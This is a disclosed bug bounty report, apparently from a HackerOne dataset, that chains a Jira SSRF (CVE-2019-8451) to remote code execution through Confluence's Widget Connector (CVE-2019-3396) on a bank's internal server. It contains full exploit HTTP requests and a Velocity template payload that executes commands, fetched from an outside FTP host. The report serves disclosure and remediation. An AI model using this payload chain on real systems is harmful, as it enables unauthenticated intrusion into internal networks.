---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '713900'
original_report_id: '713900'
title: Unauthenticated SSRF in jira.tochka.com leading to RCE in confluence.bank24.int
weakness: Code Injection
team_handle: qiwi
created_at: '2019-10-14T12:47:27.753Z'
disclosed_at: '2021-06-29T08:43:36.726Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 221
tags:
- hackerone
- code-injection
---

# Unauthenticated SSRF in jira.tochka.com leading to RCE in confluence.bank24.int

## Metadata

- HackerOne Report ID: 713900
- Weakness: Code Injection
- Program: qiwi
- Disclosed At: 2021-06-29T08:43:36.726Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Summary

This report describes a combination of two separate vulnerabilities in two separate services. This chain of vulnerabilities allows unauthenticated attacker to run arbitrary code on a server inside the company's internal network.

## Vulnerability 1
Jira at [https://jira.tochka.com](https://jira.tochka.com) is vulnerable to [SSRF in the /plugins/servlet/gadgets/makeRequest resource - CVE-2019-8451](https://jira.atlassian.com/browse/JRASERVER-69793).
Anyone on the internet can make it issue arbitrary HTTPS requests and read responses.

Moreover:
 - Any number of arbitrary HTTP headers can be specified in request.
 - Requests are not limited by type.
   - POST and GET requests are supported.

This allows an attacker to reach internal instance of Confluence [https://confluence.bank24.int](https://confluence.bank24.int).

## Vulnerability 2
Confluence at [https://confluence.bank24.int](https://confluence.bank24.int), uses a vulnerable version of a `Widget Connector` plugin. This vulnerability leads to an RCE (`CVE-2019-3396`).

There is an [advisory](https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html) by Atlassian. Also, there is a publicly known exploit to this vulnerability.

# Technical details

## SSRF
### Root cause
 - Jira uses whitelist to determine allowed URLs.
 - Jira itself is always whitelisted ([https://jira.tochka.com](https://jira.tochka.com))
 - Filter could be tricked by using URL in form of `https://jira.tochka.com:443@example.com/`


This bug could be used to send requests to an internal Confluence server [https://confluence.bank24.int](https://confluence.bank24.int) like so:

**Request example:**
```
POST /plugins/servlet/gadgets/makeRequest HTTP/1.1
Host: jira.tochka.com
User-Agent: curl/7.61.1
Accept: */*
X-Atlassian-Token: no-check
Content-Length: 53
Content-Type: application/x-www-form-urlencoded
Connection: close

url=https://jira.tochka.com:443@confluence.bank24.int
```
**Response snippet:**
```
throw 1; < don't be evil' >{"https://jira.tochka.com:443@confluence.bank24.int":{"rc":200,"headers":{},"body":"<!DOCTYPE html>\n<html>\n<head>\n                    <title>Рабочий стол - Confluence<\/title>\n    \n        \n\n                        \n    \n                        \n    \n\n    \n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=EDGE,chrome=IE7\">\n<meta charset=\"UTF-8\">\n<meta id=\"confluence-context-path\" name=\"confluence-context-path\" content=\"\">\n<meta id=\"confluence-base-url\" name=\"confluence-base-url\" content=\"https://confluence.bank24.int\">\n\n<meta id=\"atlassian-token\" name=\"atlassian-token\" content=\"f999fa99a5663c168e72b407eecdeec3695c70d0\">\n\n\n<script type=\"text/javascript\">\n        var contextPath = '';\n<\/script>\n\n    \n\n    <meta name=\"confluence-request-time\" content=\"1571051898165\">\n        \n    \n        \n            <meta name=\"ajs-discovered-plugin-features\" content=\"$discoveredList\">\n            <meta name=\"ajs-use-keyboard-shortcuts\" content=\"true\">\n            <meta name=\"ajs-keyboardshortcut-hash\" content=\"97637bc20dfc7a1f15684630bc99897\">\n            <meta id=\"team-calendars-has-jira-link\" content=\"true\">\n            <meta name=\"ajs-team-calendars-display-time-format\" content=\"displayTimeFormat24\">\n            <meta id=\"team-calendars-display-week-number\" content=\"false\">\n            <meta
...
```

## Widget connector RCE
### Vulnerability details
 - Confluence plugin preview functionality ([https://confluence.bank24.int/rest/tinymce/1/macro/preview](https://confluence.bank24.int/rest/tinymce/1/macro/preview)) is available without any authentification by design. 
 - Vulnerable plugin allows to specify a path to a server side template which is rendered.
 - This path could be a URL
 - Following schemes are supported:
   - http
   - https
   - file
   - ftp

### Attack scenario
 - Attacker hosts malicious template somewhere on the internet
 - Attacker triggers plugin preview functionality with template parameter pointing to this template
 - Malicious template is fetched and evaluated on a confluence server.

It looks that you have restrictions in place for outgoing HTTP and HTTPS requests, but not for FTP.

# PoC
I set up an FTP server to serve a malicious template at [ftp://68.183.67.159/qwe2.txt](ftp://68.183.67.159/qwe2.txt)

File contents is:

```
#set ($exp="exp")
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $exp.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end
3232
```
It takes `command` parameter, executes corresponding command and returns the result back.

To trigger this chain of vulnerabilities execute following request:

```
POST /plugins/servlet/gadgets/makeRequest HTTP/1.1
Host: jira.tochka.com
User-Agent: curl/7.61.1
Accept: */*
X-Atlassian-Token: no-check
Content-Length: 322
Content-Type: application/x-www-form-urlencoded
Connection: close

url=https://jira.tochka.com:443@confluence.bank24.int/rest/tinymce/1/macro/preview&httpMethod=POST&headers=content-type%3Dapplication/json&postData={"contentId":"1","macro":{"body":"","params":{"url":"https://www.youtube.com/watch?v=y6sOtXOvchY","_template":"ftp://68.183.67.159/qwe2.txt","command":"id"},"name":"widget"}}
```

It makes Jira to send a macro preview request to the Confluence. Confluence then fetches a template from FTP server and executes `id` command

*Response snippet:*
```
...
<div class=\"wiki-content\">\n                   uid=502(confluence) gid=502(confluence) groups=502(confluence) context=unconfined_u:system_r:initrc_t:s0\n\r\n3232\r\n\n            <\/div>\n
...
```

You may change `command` parameter to your liking.


# Mitigation recommendation

 - Upgrade Jira to version 7.13.9 or 8.4.0.
 - Update Confluence installation to use `Widget Connector` plugin version 3.1.4 or higher.

## Impact

This chain of vulnerabilities allows unauthenticated attacker to run arbitrary code on a server inside the company's internal network.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
